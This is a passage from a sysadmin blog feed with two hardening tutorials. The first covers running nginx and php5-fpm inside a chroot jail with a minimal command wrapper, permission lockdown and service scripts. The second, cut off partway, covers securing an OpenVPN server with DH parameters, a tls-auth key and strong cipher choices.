        fprintf( stderr, <span style="color:#ed9d13">&#34;Usage: %s -c &lt;cmd&gt;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, argv[<span style="color:#3677a9">0</span>] );  
        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">1</span>;
    }
 
    {
        <span style="color:#6ab825;font-weight:bold">char</span>* token;
        <span style="color:#6ab825;font-weight:bold">int</span> i = <span style="color:#3677a9">0</span>;  
        <span style="color:#6ab825;font-weight:bold">char</span>* argStr = strdup( argv[<span style="color:#3677a9">2</span>] );
        <span style="color:#6ab825;font-weight:bold">while</span>( ( token = strsep( &amp;argStr, <span style="color:#ed9d13">&#34; &#34;</span> ) ) != <span style="color:#24909d">NULL</span> ) {
            <span style="color:#6ab825;font-weight:bold">if</span>( token &amp;&amp; strlen( token ) )
                args[ i++ ] = token;
            <span style="color:#6ab825;font-weight:bold">if</span>( i &gt;= MAXARG )
                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">2</span>;
        }
    }  
 
    <span style="color:#6ab825;font-weight:bold">return</span> execvp( args[<span style="color:#3677a9">0</span>], args );
}
</code></pre></div><p>Compile this using (I use <code>clang</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ clang -O2 -fpie -pie -Wformat -Wformat-security -Werror=format-security -D_FORTIFY_SOURCE=<span style="color:#3677a9">2</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>  sh.c -o sh
</code></pre></div><p>Now remove the sources and strip the binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ rm sh.c
$ strip sh
</code></pre></div><p>However this approach seemed to introduce more problems than it was a decent solution. Depending on the applications and the scope you can decide whether to use a wrapper or provide <code>/bin/sh</code> inside your chroot. Nevertheless there should be no <code>setuid</code> binaries. More on that later.</p>
<h3 id="timezone-is-corrupt">Timezone is corrupt</h3>
<p>If you have issues like:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">PHP message: PHP Fatal error:  date(): Timezone database is corrupt - this should *never* happen!
</code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">PHP message: PHP Notice:  date_default_timezone_set(): Timezone ID <span style="color:#ed9d13">&#39;UTC&#39;</span> is invalid
</code></pre></div><p>make sure you copy <code>/usr/share/zoneinfo</code> into the chroot:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ cp -Rv /usr/share/zoneinfo <span style="color:#40ffff">$JAIL</span>/usr/share/
</code></pre></div><h2 id="adjust-chroot-security">Adjust chroot() security</h2>
<p>In fact the actual hardening of the environment has not taken place already. Many people have pointed out that <strong>chroot != security</strong> and additional steps are vital for not being able to <strong>unchroot</strong> inside it. A few years ago <a href="https://filippo.io/escaping-a-chroot-jail-slash-1/">Filippo</a> also showed how easy an attacker could achieve that if specific conditions were satisfied. Since <code>chroot()</code> in my opinion it not <strong>THE</strong> security feature I&rsquo;d say it&rsquo;s sort of <strong>security in depth</strong>. Although there are enough cases where  leaving the chroot is possible - if securing it hasn&rsquo;t been done correctly, some recommendations from <a href="http://talby.rcs.manchester.ac.uk/~isd/_unix_security/unix_security_intro_securing_network_services.Breaking_Out_of_and_Securing_Chroot_Jails.html">here</a> should be taken into consideration:</p>
<ul>
<li><strong>not</strong> run daemons as <strong>root</strong></li>
<li>avoid <strong>setuid</strong> executables</li>
<li>ensure root (<strong>UID 0</strong>) does not even exist within the jail</li>
<li>avoid unnecessary bullshit and only install the minimum inside the jail</li>
</ul>
<p>Let&rsquo;s translate those into commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Add users</span>
$ <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;www-data:x:1337:1337:www-data:/:/bin/false&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/passwd
$ <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;nobody:x:99:99:nobody:/:/bin/false&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/passwd

<span style="color:#999;font-style:italic"># Add groups</span>
$ <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;www-data:x:1337:&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/group
$ <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;nobody:x:99:&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/group

<span style="color:#999;font-style:italic"># Add shadow</span>
$ <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;www-data:x:14871::::::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/shadow
$ <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;nobody:x:14871::::::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/shadow

<span style="color:#999;font-style:italic"># Add gshadow</span>
$ <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;www-data:::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/gshadow
$ <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;nobody:::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/gshadow

<span style="color:#999;font-style:italic"># Set ownerships</span>
$ chown -R root:root <span style="color:#40ffff">$JAIL</span>/
$ chown -R www-data:www-data <span style="color:#40ffff">$JAIL</span>/www
$ chown -R www-data:www-data <span style="color:#40ffff">$JAIL</span>/etc/{nginx,php5}
$ chown -R www-data:www-data <span style="color:#40ffff">$JAIL</span>/var/{log,lib}/nginx
$ chown www-data:www-data <span style="color:#40ffff">$JAIL</span>/run/nginx.pid

<span style="color:#999;font-style:italic"># Restrict permissions</span>
$ find <span style="color:#40ffff">$JAIL</span>/ -gid <span style="color:#3677a9">0</span> -uid <span style="color:#3677a9">0</span> -type d -print | xargs chmod -rw
$ find <span style="color:#40ffff">$JAIL</span>/ -gid <span style="color:#3677a9">0</span> -uid <span style="color:#3677a9">0</span> -type d -print | xargs chmod +x
$ find <span style="color:#40ffff">$JAIL</span>/etc -gid <span style="color:#3677a9">0</span> -uid <span style="color:#3677a9">0</span> -type f -print | xargs chmod -x
$ find <span style="color:#40ffff">$JAIL</span>/usr/sbin -type f -print | xargs chmod ug+rx
$ find <span style="color:#40ffff">$JAIL</span>/ -group www-data -user www-data -print | xargs chmod o-rwx
$ chmod +rw <span style="color:#40ffff">$JAIL</span>/tmp
$ chmod +rw <span style="color:#40ffff">$JAIL</span>/run
</code></pre></div><h2 id="systemd">systemd</h2>
<p>Since <code>systemd</code>is now everywhere you can define your own <strong>service</strong> to start the daemons.</p>
<h3 id="nginx-1">nginx</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ sudo cat /etc/systemd/system/multi-user.target.wants/nginx.service 
<span style="color:#999;font-style:italic"># Stop dance for nginx</span>
<span style="color:#999;font-style:italic"># =======================</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># ExecStop sends SIGSTOP (graceful stop) to the nginx process.</span>
<span style="color:#999;font-style:italic"># If, after 5s (--retry QUIT/5) nginx is still running, systemd takes control</span>
<span style="color:#999;font-style:italic"># and sends SIGTERM (fast shutdown) to the main process.</span>
<span style="color:#999;font-style:italic"># After another 5s (TimeoutStopSec=5), and if nginx is alive, systemd sends</span>
<span style="color:#999;font-style:italic"># SIGKILL to all the remaining processes in the process group (KillMode=mixed).</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># nginx signals reference doc:</span>
<span style="color:#999;font-style:italic"># http://nginx.org/en/docs/control.html</span>
<span style="color:#999;font-style:italic">#</span>
[Unit]
<span style="color:#40ffff">Description</span>=nginx (Chroot)
<span style="color:#40ffff">After</span>=network.target

[Service]
<span style="color:#40ffff">Type</span>=forking
<span style="color:#40ffff">PIDFile</span>=/var/www/chroot/run/nginx.pid
<span style="color:#40ffff">RootDirectory</span>=/var/www/chroot
<span style="color:#40ffff">ExecStartPre</span>=/usr/sbin/nginx -t -c /etc/nginx/nginx.conf
<span style="color:#40ffff">ExecStart</span>=/usr/sbin/nginx -c /etc/nginx/nginx.conf
<span style="color:#40ffff">ExecReload</span>=/usr/sbin/nginx -c /etc/nginx/nginx.conf -s reload
<span style="color:#40ffff">ExecStop</span>=/usr/sbin/nginx -c /etc/nginx/nginx.conf -s stop
<span style="color:#40ffff">TimeoutStopSec</span>=<span style="color:#3677a9">5</span>
<span style="color:#40ffff">KillMode</span>=mixed

[Install]
<span style="color:#40ffff">WantedBy</span>=multi-user.target
</code></pre></div><p>Now run it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ sudo service nginx start
$ ps -ax | grep nginx
<span style="color:#3677a9">28530</span> ?        Ss     0:00 nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf
<span style="color:#3677a9">28531</span> ?        S      0:00 nginx: worker process
<span style="color:#3677a9">28613</span> pts/0    S+     0:00 grep nginx
$ ls -l /proc/28530/root
sudo ls -l /proc/28530/root
lrwxrwxrwx <span style="color:#3677a9">1</span> root root <span style="color:#3677a9">0</span> Jan <span style="color:#3677a9">12</span> 21:31 /proc/28530/root -&gt; /var/www/chroot
</code></pre></div><p>If you don&rsquo;t want to use <code>systemd</code> you can use following to start/stop <code>nginx</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ chroot <span style="color:#40ffff">$JAIL</span> /usr/sbin/nginx
$ pgrep nginx | xargs <span style="color:#24909d">kill</span> -9
</code></pre></div><h3 id="php5-fpm-1">php5-fpm</h3>
<p>The same applies to <code>php5-fpm</code> too:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ cat /etc/systemd/system/multi-user.target.wants/php5-fpm.service
[Unit]
<span style="color:#40ffff">Description</span>=The PHP FastCGI Process Manager
<span style="color:#40ffff">After</span>=network.target

[Service] 
<span style="color:#40ffff">Type</span>=notify
<span style="color:#40ffff">PIDFile</span>=/var/run/php5-fpm.pid
<span style="color:#40ffff">ExecStartPre</span>=/usr/xbin/php5 -t
<span style="color:#40ffff">ExecStart</span>=/usr/sbin/php5-fpm --daemonize --fpm-config /etc/php5/fpm/php-fpm.conf
<span style="color:#40ffff">ExecReload</span>=/bin/kill -USR2 <span style="color:#40ffff">$MAINPID</span>

[Install]
<span style="color:#40ffff">WantedBy</span>=multi-user.target
</code></pre></div><p>or start it manually:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ chroot <span style="color:#40ffff">$JAIL</span> /usr/sbin/php5-fpm --daemonize --fpm-config /etc/php5/fpm/php-fpm.conf
$ pgrep php | xargs <span style="color:#24909d">kill</span> -9
</code></pre></div><p>Check if it&rsquo;s indeed running in the chroot:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ ps -ax |grep fpm
 <span style="color:#3677a9">9468</span> ?        Ss     0:00 php-fpm: master process (/etc/php5/fpm/php-fpm.conf)
 <span style="color:#3677a9">9469</span> ?        S      0:00 php-fpm: pool www
 <span style="color:#3677a9">9470</span> ?        S      0:00 php-fpm: pool www
 
$ ls -l /proc/9468/root
lrwxrwxrwx <span style="color:#3677a9">1</span> root root <span style="color:#3677a9">0</span> Jan <span style="color:#3677a9">13</span> 18:04 /proc/9468/root -&gt; /var/www/chroot
</code></pre></div><h2 id="system-v">System V</h2>
<p>If you don&rsquo;t like <code>systemd</code> you can still do it the old way and have your scripts at <code>/etc/init.d/*</code>.</p>
<h3 id="nginx-2">nginx</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ cat /etc/init.d/nginx-chroot 
<span style="color:#999;font-style:italic">#!/bin/sh</span>
 
<span style="color:#999;font-style:italic">### BEGIN INIT INFO</span>
<span style="color:#999;font-style:italic"># Provides:          nginx-chroot</span>
<span style="color:#999;font-style:italic"># Required-Start:    </span>
<span style="color:#999;font-style:italic"># Required-Stop:</span>
<span style="color:#999;font-style:italic"># Default-Start:     2 3 4 5</span>
<span style="color:#999;font-style:italic"># Default-Stop:      0 1 6</span>
<span style="color:#999;font-style:italic"># Short-Description: Start nginx in a chroot</span>
<span style="color:#999;font-style:italic">### END INIT INFO</span>
 
<span style="color:#40ffff">CHROOT</span>=/var/www/chroot
 
<span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#34;</span><span style="color:#40ffff">$1</span><span style="color:#ed9d13">&#34;</span> in
  start)
        /usr/sbin/chroot <span style="color:#40ffff">$CHROOT</span> /usr/sbin/nginx -q -g <span style="color:#ed9d13">&#39;daemon on; master_process on;&#39;</span>
        ;;  
  reload)
        /usr/sbin/chroot <span style="color:#40ffff">$CHROOT</span> /usr/sbin/nginx -g <span style="color:#ed9d13">&#39;daemon on; master_process on;&#39;</span> -s reload
        ;;
  stop) 
        pgrep nginx | xargs <span style="color:#24909d">kill</span> -9  
        ;; 
  *)
        <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;Usage: </span><span style="color:#40ffff">$N</span><span style="color:#ed9d13"> {start|reload|stop}&#34;</span> &gt;&amp;<span style="color:#3677a9">2</span>
        <span style="color:#24909d">exit</span> <span style="color:#3677a9">1</span>
        ;;
<span style="color:#6ab825;font-weight:bold">esac</span>
 
<span style="color:#24909d">exit</span> <span style="color:#3677a9">0</span>
</code></pre></div><h3 id="php5-fpm-2">php5-fpm</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ cat /etc/init.d/php5-fpm-chroot 
<span style="color:#999;font-style:italic">#!/bin/sh</span>
 
<span style="color:#999;font-style:italic">### BEGIN INIT INFO</span>
<span style="color:#999;font-style:italic"># Provides:          php5-fpm-chroot</span>
<span style="color:#999;font-style:italic"># Required-Start:    </span>
<span style="color:#999;font-style:italic"># Required-Stop:</span>
<span style="color:#999;font-style:italic"># Default-Start:     2 3 4 5</span>
<span style="color:#999;font-style:italic"># Default-Stop:      0 1 6</span>
<span style="color:#999;font-style:italic"># Short-Description: Start php5-fpm in a chroot</span>
<span style="color:#999;font-style:italic">### END INIT INFO</span>
 
<span style="color:#40ffff">CHROOT</span>=/var/www/chroot
 
<span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#34;</span><span style="color:#40ffff">$1</span><span style="color:#ed9d13">&#34;</span> in
  start)
        /usr/sbin/chroot <span style="color:#40ffff">$CHROOT</span> /usr/sbin/php5-fpm --daemonize --fpm-config /etc/php5/fpm/php-fpm.conf
        ;;  
  stop) 
        pgrep php | xargs <span style="color:#24909d">kill</span> -9  
        ;; 
  *)
        <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;Usage: </span><span style="color:#40ffff">$N</span><span style="color:#ed9d13"> {start|stop}&#34;</span> &gt;&amp;<span style="color:#3677a9">2</span>
        <span style="color:#24909d">exit</span> <span style="color:#3677a9">1</span>
        ;;
<span style="color:#6ab825;font-weight:bold">esac</span>
 
<span style="color:#24909d">exit</span> <span style="color:#3677a9">0</span>
</code></pre></div><h3 id="install-new-services">Install new services</h3>
<p>First of all make sure you <strong>remove</strong> the old ones:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ update-rc.d nginx remove
$ update-rc.d php5-fpm remove
</code></pre></div><p>Now <strong>add</strong> the <strong>new</strong> ones:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ update-rc.d nginx-chroot defaults
$ update-rc.d php5-fpm-chroot defaults
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Now you have a basic structure to work with. You might want to add more <strong>binaries</strong> to the chroot but keep in mind the implied security concerns. And also try <strong>not</strong> to use symlinks/hardlinks to directories outside the chroot. You can always always override config files in the chroot with backuped one. And to make sure that everything works well, think about using <a href="http://linux.die.net/man/8/auditd">auditd</a> for monitoring file changes inside the chroot.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-host-multiple-websites-securely-with-nginx-and-php-fpm-on-ubuntu-14-04">Howt multiple websites with nginx and php-fpm</a></li>
<li><a href="https://filippo.io/escaping-a-chroot-jail-slash-1/">Escaping a chroot</a></li>
<li><a href="http://stackoverflow.com/questions/17006136/exec-with-php-fpm-on-nginx-under-chroot-returns-nothing">exec with php-fpm on nginx under chroot</a></li>
<li><a href="https://knzl.de/setting-up-a-chroot-for-php/">Setting up a chroot for php</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>OpenVPN for paranoids </title>
      <link>https://blog.dornea.nu/2015/11/17/openvpn-for-paranoids/</link>
      <pubDate>Tue, 17 Nov 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/11/17/openvpn-for-paranoids/</guid>
      <content:encoded><![CDATA[<p>Continuing my <a href="http://blog.dornea.nu/tag/admin/">admin</a> series this time I&rsquo;d like to setup a <strong>VPN</strong> using <a href="https://openvpn.net">OpenVPN  </a> as <strong>user-based</strong> VPN solution. Unlike <em>IPSec</em> solutions which require IPSec on both (server and client) sides, securing the VPN tunnel by <strong>OpenSSL</strong> is a more preferable option.</p>
<p>In this post I&rsquo;ll try to show which steps have to be taken in order to:</p>
<ul>
<li>secure the communication channel</li>
<li>use up-to-date (and secure!) TLS configurations</li>
<li>prevent information leaks when the VPN tunnel is down</li>
</ul>
<p>At least for the last one some additional steps are required to route your traffic <strong>only</strong> through the VPN tunnel. As a client you don&rsquo;t want your connection to be &ldquo;downgraded&rdquo; (in terms of security) without even realizing it. That&rsquo;s why you might want to restrict your routes and allow outbound connection only through the (virtual) interface dedicated to the VPN. How this is done and which methods exist, is covered later on.</p>
<h2 id="revision">Revision</h2>
<table cellpadding="0" cellspacing="0" width="100%" border="0">
  <tr>
    <th><b>Date</b></th>
    <th><b>Description</b></th>
  </tr>
  <tr>
    <td>2015-11-17</td>
    <td>First release</td>
  </tr>
  <tr>
    <td>2015-11-19</td>
    <td>Improved <b>ufw</b> script</b></td>
  </tr>
  <tr>
    <td>2015-11-24</td>
    <td>Added <b>iptables</b> and <b>initialization</b> script. The firewall rules are now set by iptables.</b></td>
  </tr>
</table>
<h1 id="create-certificates">Create certificates</h1>
<p>In the last <a href="http://blog.dornea.nu/2015/10/02/manage-pki-using-openssl/">post</a> I&rsquo;ve already created the <a href="http://blog.dornea.nu/2015/10/02/manage-pki-using-openssl/#Create-vpn.dornea.nu-CA">VPN CA</a> and also <strong>issued</strong> certificates for server and client. Perhaps you do remember the PKI:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%blockdiag
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;â†”</span>
blockdiag {
  // Define orientation
  orientation = portrait;

  // Define <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#a61717;background-color:#e3d2d2">(</span><span style="color:#447fcf;text-decoration:underline">list</span> of attributes)
  <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">emphasis</span> [color = pink, style = dashed];
  <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">blackline</span> [color = black, style = dotted];
  <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">blue</span> [color = lightblue];
  <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">active</span> [color = lightgreen];
  <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">inactive</span> [color = lightgrey]; 

  Root_CA [label = <span style="color:#ed9d13">&#34;dornea.nu root CA&#34;</span>];
  Signing_CA2 [label = <span style="color:#ed9d13">&#34;dev.dornea.nu CA&#34;</span>];
  Signing_CA3 [<span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#a61717;background-color:#e3d2d2">= </span><span style="color:#447fcf;text-decoration:underline">active</span>, label = <span style="color:#ed9d13">&#34;vpn.dornea.nu CA&#34;</span>];
  TLS_Server_CA [label = <span style="color:#ed9d13">&#34;TLS Server Cert&#34;</span>, shape = flowchart.terminator, style = dotted];
  TLS_Client_CA [label = <span style="color:#ed9d13">&#34;TLS Client Cert&#34;</span>, shape = flowchart.terminator, style = dotted];
  VPN_Server_CA [<span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#a61717;background-color:#e3d2d2">= </span><span style="color:#447fcf;text-decoration:underline">inactive</span>, label = <span style="color:#ed9d13">&#34;VPN Server Cert&#34;</span>, shape = flowchart.terminator, style = dotted];
  VPN_Client_CA [<span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#a61717;background-color:#e3d2d2">= </span><span style="color:#447fcf;text-decoration:underline">inactive</span>, label = <span style="color:#ed9d13">&#34;VPN Client Cert&#34;</span>, shape = flowchart.terminator, style = dotted];

  Root_CA -&gt; Signing_CA2;
  Root_CA -&gt; Signing_CA3;

  Signing_CA2 -&gt; TLS_Server_CA;
  Signing_CA2 -&gt; TLS_Client_CA;
    
  Signing_CA3 -&gt; VPN_Server_CA;
  Signing_CA3 -&gt; VPN_Client_CA;
}
</code></pre></div><p><img src="/posts/img/2015/openvpn-for-paranoias/output_2_0.png" alt="png"></p>
<p>My solution is more a <em>DIY</em> one. If you want to use a more convient one, have a look at <a href="https://github.com/OpenVPN/easy-rsa">easy-rsa</a>.</p>
<h1 id="configure-vpn-server">Configure VPN server</h1>
<p>There are several steps aimed at successfully configuring your OpenVPN server.</p>
<h2 id="basic-configuration">Basic configuration</h2>
<ul>
<li>Add new user <code>openvpn</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# useradd openvpn
</code></pre></div><ul>
<li>Specify which interface the server should listen on</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Which local IP address should OpenVPN</span>
<span style="color:#999;font-style:italic"># listen on? (optional)</span>
;<span style="color:#24909d">local</span> a.b.c.d
<span style="color:#24909d">local</span> 192.168.178.163
</code></pre></div><ul>
<li>Specify protocol and port OpenVPN should initiate connections over</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Which TCP/UDP port should OpenVPN listen on?</span>
<span style="color:#999;font-style:italic"># If you want to run multiple OpenVPN instances</span>
<span style="color:#999;font-style:italic"># on the same machine, use a different port</span>
<span style="color:#999;font-style:italic"># number for each one.  You will need to</span>
<span style="color:#999;font-style:italic"># open up this port on your firewall.</span>
port <span style="color:#3677a9">443</span>

<span style="color:#999;font-style:italic"># TCP or UDP server?</span>
;proto tcp
proto udp
</code></pre></div><ul>
<li>Specify VPN subnet where to assign IP addresses to clients from</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Configure server mode and supply a VPN subnet</span>
<span style="color:#999;font-style:italic"># for OpenVPN to draw client addresses from.</span>
<span style="color:#999;font-style:italic"># The server will take 10.8.0.1 for itself,</span>
<span style="color:#999;font-style:italic"># the rest will be made available to clients.</span>
<span style="color:#999;font-style:italic"># Each client will be able to reach the server</span>
<span style="color:#999;font-style:italic"># on 10.8.0.1. Comment this line out if you are</span>
<span style="color:#999;font-style:italic"># ethernet bridging. See the man page for more info.</span>
server 10.66.0.0 255.255.255.0
</code></pre></div><h2 id="secure-communication-channel">Secure communication channel</h2>
<h3 id="add-dh-params">Add <strong>DH params</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# openssl dhparam -out dh2048.pem <span style="color:#3677a9">2048</span>
Generating DH parameters, <span style="color:#3677a9">2048</span> bit long safe prime, generator <span style="color:#3677a9">2</span>
This is going to take a long <span style="color:#24909d">time</span>
...
</code></pre></div><p>And now add it to the config file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Diffie hellman parameters.</span>
<span style="color:#999;font-style:italic"># Generate your own with:</span>
<span style="color:#999;font-style:italic">#   openssl dhparam -out dh2048.pem 2048</span>
dh /etc/openvpn/dh2048.pem
</code></pre></div><h3 id="hmac-firewall-using-tls-auth"><strong>HMAC firewall</strong> using tls-auth</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# openvpn --genkey --secret ta.key
</code></pre></div><p>And add it to the config file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># For extra security beyond that provided</span>
<span style="color:#999;font-style:italic"># by SSL/TLS, create an &#34;HMAC firewall&#34;</span>
<span style="color:#999;font-style:italic"># to help block DoS attacks and UDP port flooding.</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># Generate with:</span>
<span style="color:#999;font-style:italic">#   openvpn --genkey --secret ta.key</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># The server and each client must have</span>
<span style="color:#999;font-style:italic"># a copy of this key.</span>
<span style="color:#999;font-style:italic"># The second parameter should be &#39;0&#39;</span>
<span style="color:#999;font-style:italic"># on the server and &#39;1&#39; on the clients.</span>
tls-auth /etc/openvpn/ta.key <span style="color:#3677a9">0</span> <span style="color:#999;font-style:italic"># This file is secret</span>
</code></pre></div><h3 id="strong-cryptographic-cipher">Strong <strong>cryptographic cipher</strong></h3>
<p>First let&rsquo;s have a look at the available ciphers (filter only those with 256 bit key length:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# openvpn --show-ciphers | grep <span style="color:#3677a9">256</span>
AES-256-CBC <span style="color:#3677a9">256</span> bit default key (fixed)
AES-256-OFB <span style="color:#3677a9">256</span> bit default key (fixed) (TLS client/server mode)
AES-256-CFB <span style="color:#3677a9">256</span> bit default key (fixed) (TLS client/server mode)
AES-256-CFB1 <span style="color:#3677a9">256</span> bit default key (fixed) (TLS client/server mode)
AES-256-CFB8 <span style="color:#3677a9">256</span> bit default key (fixed) (TLS client/server mode)
CAMELLIA-256-CBC <span style="color:#3677a9">256</span> bit default key (fixed)
CAMELLIA-256-CFB <span style="color:#3677a9">256</span> bit default key (fixed) (TLS client/server mode)
CAMELLIA-256-CFB1 <span style="color:#3677a9">256</span> bit default key (fixed) (TLS client/server mode)
CAMELLIA-256-CFB8 <span style="color:#3677a9">256</span> bit default key (fixed) (TLS client/server mode)
CAMELLIA-256-OFB <span style="color:#3677a9">256</span> bit default key (fixed) (TLS client/server mode)
</code></pre></div><p>I&rsquo;ll select <strong>AES-256-CBC</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Select a cryptographic cipher.</span>
<span style="color:#999;font-style:italic"># This config item must be copied to</span>
<span style="color:#999;font-style:italic"># the client config file as well.</span>
;cipher BF-CBC        <span style="color:#999;font-style:italic"># Blowfish (default)</span>
